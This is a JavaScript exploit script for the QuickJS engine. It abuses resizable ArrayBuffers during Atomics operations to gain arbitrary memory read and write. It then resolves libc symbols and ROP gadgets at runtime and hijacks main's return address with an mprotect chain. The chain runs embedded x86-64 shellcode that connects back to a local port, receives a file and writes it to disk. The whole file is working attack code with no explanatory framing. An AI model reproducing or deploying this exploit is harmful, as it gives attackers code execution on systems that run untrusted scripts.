'use strict';

// Offset-independent QuickJS Atomics RAB exploit -> connectback
//
// No hardcoded libc/binary/gadget offsets: all symbols/gadgets are resolved dynamically.

const U64_MASK = (1n << 64n) - 1n;
const u64 = (x) => (x & U64_MASK);

// ------------------------- vulnerability primitives -------------------------

function leak_ptr_candidate() {
  const L1 = 0x3000;
  const L2 = 0x20;

  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });

  // Barrier heap chunk (try to avoid top-chunk shrink behavior)
  let barrier = new ArrayBuffer(0x1f000);
  if (barrier.byteLength !== 0x1f000) throw 0;

  let ta = new BigInt64Array(rab);
  let evil = { valueOf() { rab.resize(L2); return 0n; } };
  return u64(Atomics.add(ta, 6, evil));
}

function make_arb_u64_view(base_addr, backing_bytes) {
  let backing = new ArrayBuffer(backing_bytes);
  let victim = null;

  const L1 = 0x70;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);

  let spray = [];
  for (let i = 0; i < 200; i++) spray.push(new ArrayBuffer(0x40));

  let evil = {
    valueOf() {
      rab.resize(L2);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  Atomics.store(ta, 13, evil);
  if (victim === null) throw new Error('arb view failed');
  return { victim, base: base_addr, size: BigInt(backing_bytes) };
}

function make_arb_u64_view_checked(base_addr, backing_bytes, checkFn) {
  for (let i = 0; i < 10; i++) {
    let mem = make_arb_u64_view(base_addr, backing_bytes);
    if (!checkFn || checkFn(mem)) return mem;
  }
  throw new Error('failed to create checked view');
}

// ------------------------------ memory helpers -----------------------------

function readU64(mem, addr) {
  let idx = Number((addr - mem.base) >> 3n);
  return u64(mem.victim[idx]);
}

function writeU64(mem, addr, val) {
  let idx = Number((addr - mem.base) >> 3n);
  mem.victim[idx] = u64(val);
}

function readU8(mem, addr) {
  let a = addr & ~7n;
  let w = readU64(mem, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffn);
}

function readU16(mem, addr) {
  return readU8(mem, addr) | (readU8(mem, addr + 1n) << 8);
}

function readU32(mem, addr) {
  return (readU16(mem, addr) | (readU16(mem, addr + 2n) << 16)) >>> 0;
}

function readU64Unaligned(mem, addr) {
  let lo = BigInt(readU32(mem, addr));
  let hi = BigInt(readU32(mem, addr + 4n));
  return lo | (hi << 32n);
}

function readCString(mem, addr) {
  let s = '';
  for (let i = 0; i < 0x800; i++) {
    let c = readU8(mem, addr + BigInt(i));
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

// ------------------------------ libc discovery -----------------------------

function looks_like_shared_lib_ptr(x) {
  // Shared libraries typically map at 0x7f..........
  return (x !== 0n) && (((x >> 40n) & 0xffn) === 0x7fn);
}

function find_libc_base_from_ptr(ptr) {
  if (!looks_like_shared_lib_ptr(ptr)) return 0n;

  let page = ptr & ~0xfffn;
  const scan = 0x400000; // 4MB
  if (page < BigInt(scan)) return 0n;
  let start = page - BigInt(scan);

  // Scan for ELF magic
  let mem = make_arb_u64_view(start & ~7n, scan + 0x4000);
  for (let off = 0; off <= scan; off += 0x1000) {
    let w = mem.victim[off >> 3];
    if ((w & 0xffffffffn) === 0x464c457fn) {
      let base = (start + BigInt(off)) & ~0xfffn;
      // sanity: ELFCLASS64 at e_ident[4] == 2
      let hdr = make_arb_u64_view(base, 0x1000);
      if (readU8(hdr, base + 4n) === 2) return base;
    }
  }
  return 0n;
}

function parse_libc_phdrs(mem, libcBase) {
  let e_phoff = readU64(mem, libcBase + 0x20n);
  let e_phentsize = readU16(mem, libcBase + 0x36n);
  let e_phnum = readU16(mem, libcBase + 0x38n);

  let dynAddr = 0n, dynSize = 0n;
  let execStart = 0n, execEnd = 0n;
  let minV = 0xffffffffffffffffn;
  let maxV = 0n;

  for (let i = 0; i < e_phnum; i++) {
    let ph = libcBase + e_phoff + BigInt(i * e_phentsize);
    let p_type = readU32(mem, ph + 0n);
    let p_flags = readU32(mem, ph + 4n);
    let p_vaddr = readU64(mem, ph + 16n);
    let p_memsz = readU64(mem, ph + 40n);

    if (p_type === 1) { // PT_LOAD
      if (p_vaddr < minV) minV = p_vaddr;
      if (p_vaddr + p_memsz > maxV) maxV = p_vaddr + p_memsz;
      if (p_flags & 1) { // PF_X
        execStart = libcBase + p_vaddr;
        execEnd = libcBase + p_vaddr + p_memsz;
      }
    } else if (p_type === 2) { // PT_DYNAMIC
      dynAddr = libcBase + p_vaddr;
      dynSize = p_memsz;
    }
  }

  let mapSize = (maxV - minV + 0xfffn) & ~0xfffn;
  return { dynAddr, dynSize, execStart, execEnd, mapSize };
}

function parse_libc_dynamic(mem, dynAddr, dynSize) {
  let strtab = 0n, symtab = 0n, gnuHash = 0n;
  let n = Number(dynSize / 16n);
  for (let i = 0; i < n; i++) {
    let ent = dynAddr + BigInt(i * 16);
    let tag = readU64Unaligned(mem, ent);
    let val = readU64Unaligned(mem, ent + 8n);
    if (tag === 0n) break;
    if (tag === 5n) strtab = val;                 // DT_STRTAB
    else if (tag === 6n) symtab = val;            // DT_SYMTAB
    else if (tag === 0x6ffffef5n) gnuHash = val;  // DT_GNU_HASH
  }
  if (!strtab || !symtab || !gnuHash) throw new Error('missing DT_*');
  return { strtab, symtab, gnuHash };
}

function gnu_hash(name) {
  let h = 5381 >>> 0;
  for (let i = 0; i < name.length; i++) {
    h = (((h * 33) >>> 0) + name.charCodeAt(i)) >>> 0;
  }
  return h >>> 0;
}

function resolve_libc_symbol(mem, libcBase, dyn, name) {
  let gh = dyn.gnuHash;

  let nbuckets = readU32(mem, gh + 0n);
  let symoffset = readU32(mem, gh + 4n);
  let bloom_size = readU32(mem, gh + 8n);
  let bloom_shift = readU32(mem, gh + 12n);

  let bloom = gh + 16n;
  let buckets = bloom + BigInt(bloom_size) * 8n;
  let chains = buckets + BigInt(nbuckets) * 4n;

  let h = gnu_hash(name);

  let bloomIdx = BigInt((Math.floor(h / 64) % bloom_size));
  let word = readU64(mem, bloom + bloomIdx * 8n);
  let b1 = 1n << BigInt(h % 64);
  let b2 = 1n << BigInt((h >>> bloom_shift) % 64);
  if ((word & (b1 | b2)) !== (b1 | b2)) return 0n;

  let bkt = readU32(mem, buckets + BigInt(h % nbuckets) * 4n);
  if (bkt < symoffset) return 0n;

  for (let idx = bkt;; idx++) {
    let ch = readU32(mem, chains + BigInt(idx - symoffset) * 4n);
    if (((ch ^ h) >>> 1) === 0) {
      let sym = dyn.symtab + BigInt(idx) * 24n;
      let st_name = readU32(mem, sym + 0n);
      let st_value = readU64(mem, sym + 8n);
      let sname = readCString(mem, dyn.strtab + BigInt(st_name));
      if (sname === name) return libcBase + st_value;
    }
    if (ch & 1) break;
  }
  return 0n;
}

function get_libc_base() {
  for (let i = 0; i < 20; i++) {
    let cand = leak_ptr_candidate();
    if (!looks_like_shared_lib_ptr(cand)) continue;
    let base = find_libc_base_from_ptr(cand);
    if (base !== 0n) return base;
  }
  return 0n;
}

// ---------------------------- gadget resolution ----------------------------

function findByte(mem, start, end, b0) {
  let p = start & ~7n;
  for (; p < end; p += 8n) {
    let w = readU64(mem, p);
    for (let i = 0; i < 8; i++) {
      let a = p + BigInt(i);
      if (a < start) continue;
      if (a >= end) return 0n;
      let b = Number((w >> BigInt(i * 8)) & 0xffn);
      if (b === b0) return a;
    }
  }
  return 0n;
}

function find2(mem, start, end, b0, b1) {
  let prev = -1;
  let p = start & ~7n;
  for (; p < end; p += 8n) {
    let w = readU64(mem, p);
    for (let i = 0; i < 8; i++) {
      let a = p + BigInt(i);
      if (a < start) continue;
      if (a >= end) return 0n;
      let b = Number((w >> BigInt(i * 8)) & 0xffn);
      if (prev === b0 && b === b1) return a - 1n;
      prev = b;
    }
  }
  return 0n;
}

function find3(mem, start, end, b0, b1, b2) {
  let p0 = -1, p1 = -1;
  let p = start & ~7n;
  for (; p < end; p += 8n) {
    let w = readU64(mem, p);
    for (let i = 0; i < 8; i++) {
      let a = p + BigInt(i);
      if (a < start) continue;
      if (a >= end) return 0n;
      let b = Number((w >> BigInt(i * 8)) & 0xffn);
      if (p0 === b0 && p1 === b1 && b === b2) return a - 2n;
      p0 = p1;
      p1 = b;
    }
  }
  return 0n;
}

function find_libc_gadgets(mem, execStart, execEnd) {
  let ret = findByte(mem, execStart, execEnd, 0xc3);
  let pop_rdi = find2(mem, execStart, execEnd, 0x5f, 0xc3);
  let pop_rsi = find2(mem, execStart, execEnd, 0x5e, 0xc3);
  let pop_rdx_rbx = find3(mem, execStart, execEnd, 0x5a, 0x5b, 0xc3);
  if (!ret || !pop_rdi || !pop_rsi || !pop_rdx_rbx) throw new Error('missing gadgets');
  return { ret, pop_rdi, pop_rsi, pop_rdx_rbx };
}

// ------------------------------- shellcode ---------------------------------

const SHELLCODE_HEX =
  '31d2be01000000bf02000000b8290000000f054189c44883ec10' +
  'c704240200270fc74424047f00000131c04889442408ba10000000' +
  '488d34244489e7b82a0000000f054881ec30110000ba04000000' +
  '488d34244489e731c00f05448b2c244489ea488d7424084489e7' +
  '31c00f05488d4424084c01e8c60000ba04000000488d34244489e7' +
  '31c00f05448b34244489f2488db424080100004489e731c00f05' +
  '4489e7b8030000000f05baa4010000be41020000488d7c2408' +
  'b8020000000f054189c74489f2488db424080100004489ffb8010000000f05' +
  '4489ffb8030000000f0531ffb83c0000000f05';

function hexToBytes(hex) {
  let bytes = [];
  for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));
  return bytes;
}

function writeBytesAsU64(mem, addr, bytes) {
  for (let i = 0; i < bytes.length; i += 8) {
    let v = 0n;
    for (let j = 0; j < 8 && (i + j) < bytes.length; j++) {
      v |= BigInt(bytes[i + j]) << BigInt(j * 8);
    }
    writeU64(mem, addr + BigInt(i), v);
  }
}

// ------------------------------- stack scan --------------------------------

function is_after_indirect_call(mem, addr) {
  let b0 = readU8(mem, addr - 2n);
  let b1 = readU8(mem, addr - 1n);
  return (b0 === 0xff) && (b1 >= 0xd0) && (b1 <= 0xd7);
}

function find_main_ret_slot(stackMem, libcMem, execStart, execEnd) {
  let n = stackMem.victim.length;
  for (let i = n - 1; i >= 0; i--) {
    let v = stackMem.victim[i];
    if (v >= execStart && v < execEnd) {
      if (is_after_indirect_call(libcMem, v)) return i;
    }
  }
  return -1;
}

// --------------------------------- exploit --------------------------------

function pwn() {
  let libcBase = get_libc_base();
  if (libcBase === 0n) return;

  let headerCheck = (mem) => ((mem.victim[0] & 0xffffffffn) === 0x464c457fn);

  let memHdr = make_arb_u64_view_checked(libcBase, 0x40000, headerCheck);
  let info = parse_libc_phdrs(memHdr, libcBase);

  let libcMem = make_arb_u64_view_checked(libcBase, Number(info.mapSize), headerCheck);
  let dyn = parse_libc_dynamic(libcMem, info.dynAddr, info.dynSize);

  let mprotect = resolve_libc_symbol(libcMem, libcBase, dyn, 'mprotect');
  let environAddr = resolve_libc_symbol(libcMem, libcBase, dyn, 'environ');
  if (!mprotect || !environAddr) return;

  let envp = readU64(libcMem, environAddr);

  const stackScan = 0x180000; // 1.5MB
  let stackBase = (envp - BigInt(stackScan)) & ~7n;

  let stackMem = make_arb_u64_view(stackBase, stackScan);
  let ret_i = find_main_ret_slot(stackMem, libcMem, info.execStart, info.execEnd);
  if (ret_i < 0) return;

  let g = find_libc_gadgets(libcMem, info.execStart, info.execEnd);

  let sc_addr = (stackBase + 0x8000n) + 0x500n;
  let sc_page = sc_addr & ~0xfffn;

  writeBytesAsU64(stackMem, sc_addr, hexToBytes(SHELLCODE_HEX));

  let chain = [
    g.ret,
    g.pop_rdi, sc_page,
    g.pop_rsi, 0x2000n,
    g.pop_rdx_rbx, 7n, 0n,
    mprotect,
    sc_addr,
  ];

  for (let j = 0; j < chain.length; j++) {
    stackMem.victim[ret_i + j] = u64(chain[j]);
  }
}

pwn();
